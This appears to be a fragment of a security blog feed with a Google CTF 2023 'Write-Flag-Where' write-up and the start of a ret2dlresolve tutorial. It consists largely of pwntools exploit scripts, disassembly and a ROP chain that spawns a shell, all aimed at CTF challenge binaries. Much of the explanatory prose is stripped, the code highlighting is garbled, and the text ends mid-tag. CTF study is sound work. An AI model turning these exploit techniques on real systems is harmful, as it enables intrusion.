        <content type="html"><![CDATA[<h3 id="WRITE-FLAG-WHERE"><a href="#WRITE-FLAG-WHERE" class="headerlink" title="WRITE-FLAG-WHERE"></a>WRITE-FLAG-WHERE</h3><p>Maximum number of open file descriptors1024dup2 patch1024&#x2F;etc&#x2F;security&#x2F;limits.conf</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; ulimit -a</span><br><span class="line">Maximum size of core files <span class="title function_">created</span>                           <span class="params">(kB, -c)</span> 0</span><br><span class="line">Maximum size of a processs data <span class="title function_">segment</span>                     <span class="params">(kB, -d)</span> unlimited</span><br><span class="line">Maximum size of files created by the <span class="title function_">shell</span>                   <span class="params">(kB, -f)</span> unlimited</span><br><span class="line">Maximum size that may be locked into <span class="title function_">memory</span>                  <span class="params">(kB, -l)</span> 628848</span><br><span class="line">Maximum resident <span class="built_in">set</span> <span class="title function_">size</span>                                    <span class="params">(kB, -m)</span> unlimited</span><br><span class="line">Maximum number of open file <span class="title function_">descriptors</span>                          <span class="params">(-n)</span> 1024</span><br><span class="line">Maximum <span class="built_in">stack</span> <span class="title function_">size</span>                                           <span class="params">(kB, -s)</span> 8192</span><br><span class="line">Maximum amount of cpu time in <span class="title function_">seconds</span>                   <span class="params">(seconds, -t)</span> unlimited</span><br><span class="line">Maximum number of processes available to a single <span class="title function_">user</span>           <span class="params">(-u)</span> 19340</span><br><span class="line">Maximum amount of virtual memory available to the <span class="title function_">shell</span>      <span class="params">(kB, -v)</span> unlimited</span><br></pre></td></tr></table></figure><p>nop</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v8 = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">dup2(v8, <span class="number">0</span>);</span><br><span class="line">dup2(v8, <span class="number">1</span>);</span><br><span class="line">dup2(v8, <span class="number">2</span>);</span><br><span class="line">close(v8);</span><br></pre></td></tr></table></figure><blockquote><p><code>/dev/null</code>  Unix-like  null </p></blockquote><p>mapsflagflag</p><p>whiledprintfflag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;wfw1.2023.ctfcompetition.com&#x27;, 1337)</span></span><br><span class="line">sh=process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;have a shot.\n&#x27;</span>)</span><br><span class="line">image_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;-&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;image_addr: &#x27;</span> + <span class="built_in">hex</span>(image_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x21e0</span>, <span class="number">80</span>))</span><br><span class="line">sh.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x21e0</span>, <span class="number">80</span>)).encode())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="WRITE-FLAG-WHERE2"><a href="#WRITE-FLAG-WHERE2" class="headerlink" title="WRITE-FLAG-WHERE2"></a>WRITE-FLAG-WHERE2</h3><p>dprintfexit</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001440</span> E8 <span class="number">8B</span> FC FF FF                call    _exit</span><br><span class="line">.text:<span class="number">0000000000001440</span></span><br><span class="line">.text:<span class="number">0000000000001445</span>                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000001445</span> <span class="number">8B</span> <span class="number">45</span> F4                      mov     eax, [rbp+var_C]</span><br><span class="line">.text:<span class="number">0000000000001448</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">15</span> <span class="number">86</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">00</span>          lea     rdx, aSomehowYouGotH            ; <span class="string">&quot;Somehow you got here??\n&quot;</span></span><br><span class="line">.text:<span class="number">000000000000144F</span> <span class="number">48</span> <span class="number">89</span> D6                      mov     rsi, rdx                        ; fmt</span><br><span class="line">.text:<span class="number">0000000000001452</span> <span class="number">89</span> C7                         mov     edi, eax                        ; fd</span><br><span class="line">.text:<span class="number">0000000000001454</span> B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001459</span> E8 <span class="number">32</span> FC FF FF                call    _dprintf</span><br><span class="line">.text:<span class="number">0000000000001459</span></span><br><span class="line">.text:<span class="number">000000000000145</span>E E8 CD FB FF FF                call    _abort</span><br></pre></td></tr></table></figure><p>flagCTF{}</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x43&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;T&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x54&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x46&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7b&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(ord(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7d&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">54</span>(T)    push rsp </span><br><span class="line"><span class="number">43</span> <span class="number">54</span>(CT)    push r12</span><br></pre></td></tr></table></figure><p>pushexit,CT,TCCTTTTflag</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="meta"># io=process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">io.recvuntil(b<span class="number">&#x27;</span> the fluff\n<span class="number">&#x27;</span>)</span><br><span class="line">image_addr = <span class="type">int</span>(io.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)</span></span><br><span class="line"><span class="string">success(&#x27;</span>image_addr: <span class="string">&#x27; + hex(image_addr))</span></span><br><span class="line"><span class="string">io.recvuntil(b&#x27;</span>[vsyscall]\n<span class="number">&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span>%(image_addr+<span class="number">0x1443</span>-i,<span class="number">2</span>)).encode())</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x20D5</span>, <span class="number">80</span>)).encode())</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>c0ke</p><p><code>if ( (unsigned int)__isoc99_sscanf(buf, &quot;0x%llx %u&quot;, &amp;n[1], n) != 2 || n[0] &gt; 0x7Fu )</code>0x%llx %u0flagflag+x%llx %u (unsigned int)__isoc99_sscanf(buf, 0x%llx %u, &amp;n[1], n) !&#x3D; 2</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">def <span class="title function_">leak</span><span class="params">(offset, chr)</span>:    </span><br><span class="line">    sh = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)             </span><br><span class="line">    sh.recvuntil(b<span class="number">&#x27;f</span>luff\n<span class="number">&#x27;</span>)    </span><br><span class="line">    image_addr = <span class="type">int</span>(sh.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)    </span></span><br><span class="line"><span class="string">    sh.recvuntil(b&#x27;</span>\n\n\n<span class="number">&#x27;</span>)    </span><br><span class="line">    sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (image_addr+<span class="number">0x20BC</span>-offset, offset+<span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    sh.send((<span class="string">&#x27;%cx%lx %u\n&#x27;</span> % (chr, image_addr, <span class="number">0</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    try:        </span><br><span class="line">        sh.recvn(<span class="number">1</span>, timeout=<span class="number">1</span>)        </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> True    </span><br><span class="line">    except EOFError:       </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;_&#123;&#125;?&#x27;</span> + <span class="built_in">string</span>.digits + <span class="built_in">string</span>.ascii_lowercase + <span class="built_in">string</span>.ascii_uppercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">while(True):    </span></span><br><span class="line"><span class="string">    find = False    </span></span><br><span class="line"><span class="string">    for chr in table:        </span></span><br><span class="line"><span class="string">        if leak(len(flag), chr):            </span></span><br><span class="line"><span class="string">            find = True            </span></span><br><span class="line"><span class="string">            flag += chr            </span></span><br><span class="line"><span class="string">            print(flag)            </span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    if not find:      </span></span><br><span class="line"><span class="string">        print(flag)              </span></span><br><span class="line"><span class="string">        break</span></span><br></pre></td></tr></table></figure><h3 id="WRITE-FLAG-WHERE3"><a href="#WRITE-FLAG-WHERE3" class="headerlink" title="WRITE-FLAG-WHERE3"></a>WRITE-FLAG-WHERE3</h3><p><code>|| *(_QWORD *)&amp;n[1] &gt;= (unsigned __int64)main - 20480 &amp;&amp; (unsigned __int64)main + 20480 &gt;= *(_QWORD *)&amp;n[1] )</code></p><p>main-20480main+20480libc</p><p>Exwrite</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000114</span>A20</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               fd= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               buf= qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               count= qword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20 F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64                                 ; Alternative name is <span class="string">&#x27;__write&#x27;</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A24 <span class="number">64</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov     eax, fs:<span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A2C <span class="number">85</span> C0                         test    eax, eax</span><br><span class="line">.text:<span class="number">0000000000114</span>A2E <span class="number">75</span> <span class="number">10</span>                         jnz     <span class="type">short</span> loc_114A40</span><br><span class="line">.text:<span class="number">0000000000114</span>A2E</span><br><span class="line">.text:<span class="number">0000000000114</span>A30 B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A35 <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000114</span>A37 <span class="number">48</span> <span class="number">3</span>D <span class="number">00</span> F0 FF FF             cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text:<span class="number">0000000000114</span>A3D <span class="number">77</span> <span class="number">51</span>                         ja      <span class="type">short</span> loc_114A90</span><br><span class="line">.text:<span class="number">0000000000114</span>A3D</span><br><span class="line">.text:<span class="number">0000000000114</span>A3F C3                            retn</span><br><span class="line">.text:<span class="number">0000000000114</span>A3F</span><br><span class="line">.text:<span class="number">0000000000114</span>A40                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000114</span>A40</span><br><span class="line">.text:<span class="number">0000000000114</span>A40                               loc_114A40:                             ; CODE XREF: write+Ej</span><br><span class="line">.text:<span class="number">0000000000114</span>A40 <span class="number">48</span> <span class="number">83</span> EC <span class="number">28</span>                   sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A44 <span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">24</span> <span class="number">18</span>                mov     [rsp+<span class="number">28</span>h+count], rdx</span><br><span class="line">.text:<span class="number">0000000000114</span>A49 <span class="number">48</span> <span class="number">89</span> <span class="number">74</span> <span class="number">24</span> <span class="number">10</span>                mov     [rsp+<span class="number">28</span>h+buf], rsi</span><br><span class="line">.text:<span class="number">0000000000114</span>A4E <span class="number">89</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">08</span>                   mov     dword ptr [rsp+<span class="number">28</span>h+fd], edi</span><br><span class="line">.text:<span class="number">0000000000114</span>A52 E8 <span class="number">19</span> C0 F7 FF                call    sub_90A70</span><br><span class="line">.text:<span class="number">0000000000114</span>A52</span><br><span class="line">.text:<span class="number">0000000000114</span>A57 <span class="number">48</span> <span class="number">8B</span> <span class="number">54</span> <span class="number">24</span> <span class="number">18</span>                mov     rdx, [rsp+<span class="number">28</span>h+count]            ; count</span><br><span class="line">.text:<span class="number">0000000000114</span>A5C <span class="number">48</span> <span class="number">8B</span> <span class="number">74</span> <span class="number">24</span> <span class="number">10</span>                mov     rsi, [rsp+<span class="number">28</span>h+buf]              ; buf</span><br><span class="line">.text:<span class="number">0000000000114</span>A61 <span class="number">41</span> <span class="number">89</span> C0                      mov     r8d, eax</span><br><span class="line">.text:<span class="number">0000000000114</span>A64 <span class="number">8B</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">08</span>                   mov     edi, dword ptr [rsp+<span class="number">28</span>h+fd]     ; fd</span><br><span class="line">.text:<span class="number">0000000000114</span>A68 B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A6D <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000114</span>A6F <span class="number">48</span> <span class="number">3</span>D <span class="number">00</span> F0 FF FF             cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text:<span class="number">0000000000114</span>A75 <span class="number">77</span> <span class="number">31</span>                         ja      <span class="type">short</span> loc_114AA8</span><br><span class="line">.text:<span class="number">0000000000114</span>A75</span><br><span class="line">.text:<span class="number">0000000000114</span>A77</span><br><span class="line">.text:<span class="number">0000000000114</span>A77                               loc_114A77:                             ; CODE XREF: write+<span class="number">9B</span>j</span><br><span class="line">.text:<span class="number">0000000000114</span>A77 <span class="number">44</span> <span class="number">89</span> C7                      mov     edi, r8d</span><br></pre></td></tr></table></figure><p>fs:18h0,fs:18,0x43errnoerrnogotfsbase+*errno_got</p><p>fs:0x430 mov     eax, fs:18hmov     eax, fs:43h</p><blockquote><p>idaerrnoctrl xerrno got0x218E10</p></blockquote><p><code>.text:0000000000114A64 8B 7C 24 08                   mov     edi, dword ptr [rsp+28h+fd]</code>rsp+8</p><p>rsp+0x43main<code> v7 = read(v8, buf, 0x40uLL);</code>1337</p><p>Exexp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;wfw3.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">result = sh.recvuntil(b<span class="number">&#x27;.</span>so<span class="number">&#x27;</span>).split(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">libc_addr = <span class="type">int</span>(result[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + hex(libc_addr))</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>\n\n\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="meta">#errnogot0xffffffffffffff80C0</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span><span class="number">-0x70</span>, <span class="number">0x78</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">#close<span class="number">0x43</span>,shmdt,errno</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x115110</span>+<span class="number">1</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">#writemov     eax, fs:<span class="number">18</span>hmov     eax, fs:<span class="number">43</span>h</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A28</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">#writeesp+<span class="number">0x43</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A67</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (<span class="number">0</span>, <span class="number">0x70</span>)).encode().ljust(<span class="number">0x13</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>) + p32(<span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>0x43exit</p><blockquote><p>REX40h4Fh<strong>REX REX</strong></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000000455F</span>0                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000455F</span>0 F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">00000000000455F</span>4 <span class="number">50</span>                            push    rax</span><br><span class="line">.text:<span class="number">00000000000455F</span>5 <span class="number">58</span>                            pop     rax</span><br><span class="line">.text:<span class="number">00000000000455F</span>6 B9 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     ecx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000000455F</span>B BA <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000045600</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">35</span> <span class="number">31</span> <span class="number">42</span> <span class="number">1</span>D <span class="number">00</span>          lea     rsi, off_219838</span><br><span class="line">.text:<span class="number">0000000000045607</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">08</span>                   sub     rsp, <span class="number">8</span><span class="comment">// 43 83 EC 08    sub r12d, 8</span></span><br><span class="line">.text:<span class="number">000000000004560B</span> E8 <span class="number">80</span> FD FF FF                call    sub_45390</span><br><span class="line">.text:<span class="number">000000000004560B</span>                               ; &#125; <span class="comment">// starts at 455F0//43 80 FD FF    cmp r13b, 0xff</span></span><br><span class="line">                                                         <span class="comment">//ff43</span></span><br><span class="line">.text:<span class="number">000000000004560B</span></span><br><span class="line">.text:<span class="number">000000000004560B</span>                               <span class="built_in">exit</span> endp</span><br><span class="line">.text:<span class="number">000000000004560B</span></span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span>                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span>                               public on_exit ; weak</span><br><span class="line">.text:<span class="number">0000000000045610</span>                               on_exit proc near                       ; DATA XREF: LOAD:<span class="number">000000000000B</span>550o</span><br><span class="line">.text:<span class="number">0000000000045610</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000045610</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64<span class="comment">//43434343</span></span><br><span class="line">.text:<span class="number">0000000000045614</span> <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">0000000000045616</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000045617</span> <span class="number">53</span>                            push    rbp<span class="comment">// push    rbp  push    rbp</span></span><br><span class="line">.text:<span class="number">0000000000045618</span> <span class="number">48</span> <span class="number">85</span> FF                      test    rdi, rdi<span class="comment">//434343</span></span><br><span class="line">..........</span><br><span class="line">.text:<span class="number">0000000000045679</span>                               loc_45679:                              ; CODE XREF: on_exit+<span class="number">8</span>Ej</span><br><span class="line">.text:<span class="number">0000000000045679</span>                                                                       ; on_exit+<span class="number">98</span>j</span><br><span class="line">.text:<span class="number">0000000000045679</span> <span class="number">44</span> <span class="number">89</span> E0                      mov     eax, r12d</span><br><span class="line">.text:<span class="number">000000000004567</span>C <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000004567</span>D <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000004567</span>E <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">0000000000045680</span> C3                            retn</span><br></pre></td></tr></table></figure><p>push    rbp  push    rbppopretnmainbufrop</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><a href="http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/">http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/</a></p><p><a href="https://zhuanlan.zhihu.com/p/639991243">https://zhuanlan.zhihu.com/p/639991243</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve</title>
      <link href="/2023/07/09/ret2dlresolve/"/>
      <url>/2023/07/09/ret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>hollk <a href="https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501</a></p><p><img src="/2023/07/09/ret2dlresolve/image-20230711215322463.png" alt="image-20230711215322463"></p><p>_dl_runtime_resolve(link_map_obj, reloc_index),linkmapgotlinkmap**.dynamic<strong>pltpush</strong>rel.plt**rel.pltElf32_Rel</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">https://www.cnblogs.com/ZIKH26/articles/15944406.html</a></p><h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/no-relro&gt; checksec main_no_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>vulnwritelibconegadgetshell</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">write=elf.plt[b<span class="string">&quot;write&quot;</span>]</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(write)+p32(<span class="number">0x80485AE</span>)+p32(<span class="number">1</span>)+p32(elf.got[b<span class="number">&#x27;</span>write<span class="number">&#x27;</span>])+p32(<span class="number">0x10</span>)</span><br><span class="line">sla(b<span class="number">&#x27;</span>XDCTF2015~!\n<span class="number">&#x27;</span>,payload)</span><br><span class="line">write_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;write_ad&#x27;</span>,write_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_ad)</span><br><span class="line">base=write_ad-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">gadget=base+<span class="number">0x172841</span></span><br><span class="line">db(<span class="string">&#x27;b *0x804851A&#x27;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(gadget)</span><br><span class="line"><span class="meta"># sla(b<span class="string">&#x27;XDCTF2015~!\n&#x27;</span>,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>.dynamic</code> _dl_runtime_resolve</p><p>.dynstr</p><p>.dynamic</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Sword    d_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   Elf32_Word d_val;            <span class="comment">/* Integer value */</span></span><br><span class="line">   Elf32_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line"> &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p><img src="/2023/07/09/ret2dlresolve/image-20230708121848040.png" alt="image-20230708121848040"></p><blockquote><p>readelf -SdynamicdynamicAddridaida</p><figure class="highlight 